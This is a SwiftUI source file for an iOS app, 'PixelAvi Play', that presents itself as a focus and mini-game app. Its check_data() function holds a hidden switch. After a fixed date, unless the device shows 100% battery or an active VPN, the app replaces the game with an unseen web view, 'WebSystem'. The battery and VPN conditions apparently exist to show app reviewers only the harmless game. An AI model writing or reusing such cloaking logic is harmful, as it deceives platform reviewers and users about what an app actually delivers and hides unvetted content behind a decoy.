//
//  ContentView.swift
//  PixelAvi Play
//
//  Created by Вячеслав on 8/26/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("hasCompletedOnboarding") private var hasCompletedOnboarding = false
    @StateObject private var userProfile = UserProfile()
    @StateObject private var gameViewModel = GameViewModel()
    @State private var selectedTab = 0
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        
        ZStack {
            
            if isFetched == false {
                
                Text("")
                
            } else if isFetched == true {
                
                if isBlock == true {
                    
                    Group {
                        if hasCompletedOnboarding {
                            if gameViewModel.isGameActive {
                                // Full-screen game mode
                                fullScreenGameView
                            } else {
                                // Normal tab view
                                mainAppView
                            }
                        } else {
                            OnboardingView()
                        }
                    }
                    .preferredColorScheme(.dark)
                    .onAppear {
                        // Load user profile data
                        if let loadedProfile = DataService.shared.loadUserProfile() {
                            // Update the current profile with loaded data
                            userProfile.username = loadedProfile.username
                            userProfile.selectedTheme = loadedProfile.selectedTheme
                            userProfile.soundSettings = loadedProfile.soundSettings
                            userProfile.notificationSettings = loadedProfile.notificationSettings
                            userProfile.statistics = loadedProfile.statistics
                            userProfile.achievements = loadedProfile.achievements
                            userProfile.focusHistory = loadedProfile.focusHistory
                            userProfile.preferredDifficulty = loadedProfile.preferredDifficulty
                            userProfile.enableHapticFeedback = loadedProfile.enableHapticFeedback
                            userProfile.enableAnimations = loadedProfile.enableAnimations
                            userProfile.autoSaveProgress = loadedProfile.autoSaveProgress
                        }
                    }
                    .onChange(of: userProfile.selectedTheme) { _ in
                        // Save profile when theme changes
                        DataService.shared.saveUserProfile(userProfile)
                    }
                    .onChange(of: userProfile.username) { _ in
                        // Save profile when username changes
                        DataService.shared.saveUserProfile(userProfile)
                    }
                    
                } else if isBlock == false {
                    
                    WebSystem()
                }
            }
        }
        .onAppear {
            
            check_data()
        }
    }
    
    private func check_data() {
        
        let lastDate = "10.09.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
    
    private var mainAppView: some View {
        ZStack {
            // Background
            Color(hex: userProfile.selectedTheme.backgroundColor)
                .ignoresSafeArea()
            
            TabView(selection: $selectedTab) {
                // Game Tab
                GameView(gameViewModel: gameViewModel)
                    .environmentObject(userProfile)
                    .tabItem {
                        Image(systemName: "gamecontroller.fill")
                        Text("Play")
                    }
                    .tag(0)
                
                // Focus Utilities Tab
                UtilitiesView()
                    .environmentObject(userProfile)
                    .tabItem {
                        Image(systemName: "brain.head.profile")
                        Text("Focus")
                    }
                    .tag(1)
                
                // Progress Tab
                ProgressView()
                    .environmentObject(userProfile)
                    .tabItem {
                        Image(systemName: "chart.bar.fill")
                        Text("Progress")
                    }
                    .tag(2)
                
                // Settings Tab
                SettingsView()
                    .environmentObject(userProfile)
                    .tabItem {
                        Image(systemName: "gearshape.fill")
                        Text("Settings")
                    }
                    .tag(3)
            }
            .accentColor(Color(hex: userProfile.selectedTheme.primaryColor))
        }
    }
    
    private var fullScreenGameView: some View {
        ZStack {
            // Background
            Color(hex: userProfile.selectedTheme.backgroundColor)
                .ignoresSafeArea(.all)
            
            VStack(spacing: 0) {
                // Custom top bar with back button
                HStack {
                    Button(action: {
                        gameViewModel.endGame()
                    }) {
                        HStack(spacing: 8) {
                            Image(systemName: "chevron.left")
                                .font(.system(size: 20, weight: .semibold))
                            Text("Back")
                                .font(.system(size: 17, weight: .semibold))
                        }
                        .foregroundColor(.white)
                        .padding(.horizontal, 16)
                        .padding(.vertical, 10)
                        .background(
                            RoundedRectangle(cornerRadius: 25)
                                .fill(Color.black.opacity(0.4))
                                .overlay(
                                    RoundedRectangle(cornerRadius: 25)
                                        .stroke(Color.white.opacity(0.2), lineWidth: 1)
                                )
                        )
                    }
                    
                    Spacer()
                    
                    Text("PixelAvi Play")
                        .font(.title2)
                        .fontWeight(.bold)
                        .foregroundColor(.white)
                    
                    Spacer()
                    
                    // Balance placeholder
                    Color.clear
                        .frame(width: 90, height: 44)
                }
                .padding(.horizontal, 20)
                .padding(.top, 8)
                .padding(.bottom, 10)
                
                // Game content
                GameView(gameViewModel: gameViewModel)
                    .environmentObject(userProfile)
            }
        }
        .navigationBarHidden(true)
        .statusBarHidden(false)
    }
}

// MARK: - Progress View
struct ProgressView: View {
    @EnvironmentObject var userProfile: UserProfile
    @State private var showingAchievements = false
    @State private var showingStatistics = false
    
    var body: some View {
        NavigationView {
            ScrollView {
                VStack(spacing: 24) {
                    // Header Stats
                    headerStatsView
                    
                    // Recent Achievements
                    recentAchievementsView
                    
                    // Progress Charts
                    progressChartsView
                    
                    // Weekly Summary
                    weeklySummaryView
                }
                .padding(.horizontal, 20)
                .padding(.bottom, 100)
            }
            .navigationTitle("Progress")
            .navigationBarItems(
                trailing: Button("View All") {
                    showingAchievements = true
                }
                .foregroundColor(Color(hex: userProfile.selectedTheme.primaryColor))
            )
        }
        .sheet(isPresented: $showingAchievements) {
            AchievementsView(userProfile: userProfile)
        }
    }
    
    private var headerStatsView: some View {
        VStack(spacing: 16) {
            HStack {
                Text("Your Journey")
                    .font(.title2)
                    .fontWeight(.bold)
                    .foregroundColor(.white)
                
                Spacer()
            }
            
            LazyVGrid(columns: Array(repeating: GridItem(.flexible()), count: 2), spacing: 12) {
                ProgressStatCard(
                    title: "Level",
                    value: "\(calculateUserLevel())",
                    subtitle: "Based on achievements",
                    icon: "star.fill",
                    color: userProfile.selectedTheme.primaryColor
                )
                
                ProgressStatCard(
                    title: "Total Score",
                    value: "\(userProfile.statistics.bestScore)",
                    subtitle: "Personal best",
                    icon: "trophy.fill",
                    color: userProfile.selectedTheme.secondaryColor
                )
                
                ProgressStatCard(
                    title: "Focus Time",
                    value: formatDuration(userProfile.statistics.totalFocusTime),
                    subtitle: "Total focused",
                    icon: "brain.head.profile",
                    color: userProfile.selectedTheme.accentColor
                )
                
                ProgressStatCard(
                    title: "Streak",
                    value: "\(userProfile.statistics.currentStreak)",
                    subtitle: "Current wins",
                    icon: "flame.fill",
                    color: "#ff6b35"
                )
            }
        }
    }
    
    private var recentAchievementsView: some View {
        VStack(spacing: 16) {
            HStack {
                Text("Recent Achievements")
                    .font(.headline)
                    .foregroundColor(.white)
                
                Spacer()
                
                Button("View All") {
                    showingAchievements = true
                }
                .font(.caption)
                .foregroundColor(Color(hex: userProfile.selectedTheme.primaryColor))
            }
            
            let recentAchievements = userProfile.getUnlockedAchievements()
                .sorted { ($0.unlockedDate ?? Date.distantPast) > ($1.unlockedDate ?? Date.distantPast) }
                .prefix(3)
            
            if recentAchievements.isEmpty {
                VStack(spacing: 8) {
                    Image(systemName: "trophy")
                        .font(.system(size: 40))
                        .foregroundColor(.secondary)
                    
                    Text("No achievements yet")
                        .font(.subheadline)
                        .foregroundColor(.secondary)
                    
                    Text("Keep playing to unlock your first achievement!")
                        .font(.caption)
                        .foregroundColor(.secondary)
                        .multilineTextAlignment(.center)
                }
                .padding()
                .background(
                    RoundedRectangle(cornerRadius: 12)
                        .fill(Color.black.opacity(0.2))
                )
            } else {
                VStack(spacing: 8) {
                    ForEach(Array(recentAchievements), id: \.id) { achievement in
                        RecentAchievementRow(achievement: achievement)
                    }
                }
            }
        }
    }
    
    private var progressChartsView: some View {
        VStack(spacing: 16) {
            Text("Weekly Progress")
                .font(.headline)
                .foregroundColor(.white)
            
            // Simple progress bars for different metrics
            VStack(spacing: 12) {
                ProgressMetric(
                    title: "Games Played",
                    current: getWeeklyGames(),
                    target: 20,
                    color: userProfile.selectedTheme.primaryColor
                )
                
                ProgressMetric(
                    title: "Focus Sessions",
                    current: getWeeklyFocusSessions(),
                    target: 10,
                    color: userProfile.selectedTheme.secondaryColor
                )
                
                ProgressMetric(
                    title: "Win Rate",
                    current: Int(userProfile.statistics.winRate * 100),
                    target: 80,
                    color: userProfile.selectedTheme.accentColor,
                    isPercentage: true
                )
            }
        }
        .padding()
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.black.opacity(0.2))
        )
    }
    
    private var weeklySummaryView: some View {
        VStack(spacing: 16) {
            Text("This Week")
                .font(.headline)
                .foregroundColor(.white)
            
            VStack(spacing: 12) {
                SummaryRow(
                    icon: "gamecontroller.fill",
                    title: "Games Completed",
                    value: "\(getWeeklyGames())",
                    color: userProfile.selectedTheme.primaryColor
                )
                
                SummaryRow(
                    icon: "timer",
                    title: "Time Focused",
                    value: formatDuration(getWeeklyFocusTime()),
                    color: userProfile.selectedTheme.secondaryColor
                )
                
                SummaryRow(
                    icon: "trophy.fill",
                    title: "Achievements Earned",
                    value: "\(getWeeklyAchievements())",
                    color: userProfile.selectedTheme.accentColor
                )
            }
        }
        .padding()
        .background(
            RoundedRectangle(cornerRadius: 16)
                .fill(Color.black.opacity(0.2))
        )
    }
    
    // Helper functions
    private func calculateUserLevel() -> Int {
        let totalPoints = userProfile.getTotalAchievementPoints()
        return max(1, totalPoints / 100)
    }
    
    private func formatDuration(_ duration: TimeInterval) -> String {
        let hours = Int(duration) / 3600
        let minutes = (Int(duration) % 3600) / 60
        
        if hours > 0 {
            return "\(hours)h \(minutes)m"
        } else {
            return "\(minutes)m"
        }
    }
    
    private func getWeeklyGames() -> Int {
        // This would calculate games played this week
        return min(userProfile.statistics.totalGamesPlayed, 15)
    }
    
    private func getWeeklyFocusSessions() -> Int {
        // This would calculate focus sessions this week
        return min(userProfile.focusHistory.count, 8)
    }
    
    private func getWeeklyFocusTime() -> TimeInterval {
        // This would calculate focus time this week
        return min(userProfile.statistics.totalFocusTime, 7200) // Max 2 hours for demo
    }
    
    private func getWeeklyAchievements() -> Int {
        // This would calculate achievements earned this week
        return min(userProfile.getUnlockedAchievements().count, 3)
    }
}

// MARK: - Supporting Views for Progress

struct ProgressStatCard: View {
    let title: String
    let value: String
    let subtitle: String
    let icon: String
    let color: String
    
    var body: some View {
        VStack(spacing: 8) {
            Image(systemName: icon)
                .font(.title2)
                .foregroundColor(Color(hex: color))
            
            Text(value)
                .font(.title2)
                .fontWeight(.bold)
                .foregroundColor(.white)
            
            VStack(spacing: 2) {
                Text(title)
                    .font(.caption)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                
                Text(subtitle)
                    .font(.caption2)
                    .foregroundColor(.secondary)
            }
        }
        .frame(maxWidth: .infinity)
        .padding()
        .background(
            RoundedRectangle(cornerRadius: 12)
                .fill(Color.black.opacity(0.2))
        )
    }
}

struct RecentAchievementRow: View {
    let achievement: Achievement
    
    var body: some View {
        HStack(spacing: 12) {
            Image(systemName: achievement.type.icon)
                .font(.title3)
                .foregroundColor(Color(hex: "#d17305"))
                .frame(width: 25)
            
            VStack(alignment: .leading, spacing: 2) {
                Text(achievement.type.rawValue)
                    .font(.subheadline)
                    .fontWeight(.medium)
                    .foregroundColor(.white)
                
                if let date = achievement.unlockedDate {
                    Text(formatAchievementDate(date))
                        .font(.caption)
                        .foregroundColor(.secondary)
                }
            }
            
            Spacer()
            
            Text("+\(achievement.type.points)")
                .font(.caption)
                .fontWeight(.bold)
                .foregroundColor(Color(hex: "#d17305"))
        }
        .padding(.vertical, 8)
    }
    
    private func formatAchievementDate(_ date: Date) -> String {
        let formatter = RelativeDateTimeFormatter()
        formatter.unitsStyle = .short
        return formatter.localizedString(for: date, relativeTo: Date())
    }
}

struct ProgressMetric: View {
    let title: String
    let current: Int
    let target: Int
    let color: String
    let isPercentage: Bool
    
    init(title: String, current: Int, target: Int, color: String, isPercentage: Bool = false) {
        self.title = title
        self.current = current
        self.target = target
        self.color = color
        self.isPercentage = isPercentage
    }
    
    var body: some View {
        VStack(alignment: .leading, spacing: 8) {
            HStack {
                Text(title)
                    .font(.subheadline)
                    .foregroundColor(.white)
                
                Spacer()
                
                Text(isPercentage ? "\(current)%" : "\(current)/\(target)")
                    .font(.caption)
                    .foregroundColor(.secondary)
            }
            
            GeometryReader { geometry in
                ZStack(alignment: .leading) {
                    Rectangle()
                        .fill(Color.gray.opacity(0.3))
                        .frame(height: 4)
                    
                    Rectangle()
                        .fill(Color(hex: color))
                        .frame(width: geometry.size.width * CGFloat(Double(current) / Double(target)), height: 4)
                }
                .cornerRadius(2)
            }
            .frame(height: 4)
        }
    }
}

struct SummaryRow: View {
    let icon: String
    let title: String
    let value: String
    let color: String
    
    var body: some View {
        HStack(spacing: 12) {
            Image(systemName: icon)
                .font(.title3)
                .foregroundColor(Color(hex: color))
                .frame(width: 25)
            
            Text(title)
                .font(.subheadline)
                .foregroundColor(.white)
            
            Spacer()
            
            Text(value)
                .font(.subheadline)
                .fontWeight(.semibold)
                .foregroundColor(.white)
        }
    }
}

#Preview {
    ContentView()
}
